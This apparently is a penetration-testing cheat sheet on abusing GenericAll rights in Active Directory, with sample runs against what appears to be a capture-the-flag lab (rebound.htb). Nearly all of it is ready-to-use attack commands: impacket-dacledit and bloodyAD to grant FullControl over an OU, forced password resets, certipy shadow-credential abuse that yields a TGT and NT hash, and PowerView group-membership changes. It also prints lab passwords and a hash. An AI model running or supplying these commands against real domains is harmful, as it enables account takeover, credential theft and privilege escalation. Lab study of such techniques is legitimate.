---
title: "GenericAll"
date: 2024-7-12
tags: ["Shadow Credentials", "Powerview", "Credential Dumping", "AddMember", "Impacket", "Genericall", "Domain Controller", "Active Directory", "Windows"]
---

### Abuse #1: Change Target User Password

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Add Full Control to Current User

{{< tab set1-1 tab1 active >}}impacket{{< /tab >}}{{< tab set1-1 tab2 >}}bloodyAD{{< /tab >}}
{{< tabcontent set1-1 tab1 >}}

```console
sudo ntpdate -s <DC> && impacket-dacledit -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
```

```console {class=sample-code}
$ impacket-dacledit -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20240923-015912.bak
[*] DACL modified successfully!
```

{{< /tabcontent >}}
{{< tabcontent set1-1 tab2 >}}

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class=sample-code}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

{{< /tabcontent >}}

#### 2. Change Password

{{< tab set1-2 tab1 active >}}bloodyAD{{< /tab >}}
{{< tabcontent set1-2 tab1 >}}

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 set password 'winrm_svc' 'Test1234'
[+] Password changed successfully!
```

<small>*Ref: [bloodyAD](https://github.com/CravateRouge/bloodyAD)*</small>

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView.ps1 

```console
. .\PowerView.ps1
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
```

#### 2. Change Target User Password

```console
$password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force 
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> $password = ConvertTo-SecureString Test1234 -AsPlainText -Force
```

```console
Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password
```

```console {class=sample-code}
*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity superfume -AccountPassword $password
```

{{< /tabcontent >}}

---

### Abuse #2: Get Shadow Credential

{{< tab set3 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set3 tab1 >}}

#### 1. Add Full Control to Current User

{{< tab set3-1 tab1 active >}}impacket{{< /tab >}}{{< tab set3-1 tab2 >}}bloodyAD{{< /tab >}}
{{< tabcontent set3-1 tab1 >}}

```console
sudo ntpdate -s <DC> && impacket-dacledit -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps
```

```console {class="sample-code"}
$ impacket-dacledit -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps
Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20240923-015912.bak
[*] DACL modified successfully!
```

{{< /tabcontent >}}
{{< tabcontent set3-1 tab2 >}}

```console
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<USER>'
```

```console {class="sample-code"}
$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' 'oorend'
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
```

{{< /tabcontent >}}

#### 2. Get Shadow Credential

```console
sudo ntpdate -s <DC> && certipy-ad shadow auto -username <USER>@<DOMAIN> -password '<PASSWORD>' -k -account <TARGET_USER> -target <DC> -scheme ldap
```

```console {class="sample-code"}
$ sudo ntpdate -s dc01.rebound.htb && certipy-ad shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '22fdb427-7028-72b8-bc39-8f4674c644dd'
[*] Adding Key Credential with device ID '22fdb427-7028-72b8-bc39-8f4674c644dd' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '22fdb427-7028-72b8-bc39-8f4674c644dd' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Using principal: winrm_svc@rebound.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 4469650fd892e98933b4536d2e86e512
```

#### FIX: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)

```console
# No really a fix, need to runas administrator
gpupdate /force
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\Users\Administrator\Documents> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.

User Policy update has completed successfully.
```

{{< /tabcontent >}}

---

### Abuse #3 : Add User to Group

{{< tab set4 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set4 tab1 >}}

#### 1. Import PowerView
```console
. .\PowerView.ps1
```

#### 2. Create a Cred Object (runas) \[Optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 2. Add User to Group

```console
Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
```

{{< /tabcontent >}}

---

### Abuse #4 : Add GenericAll to Target User over Organizational Unit (OU)

{{< tab set5 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set5 tab1 >}}

```console
# Password
bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add genericAll 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' '<TARGET_USER>'
```

{{< /tabcontent >}}

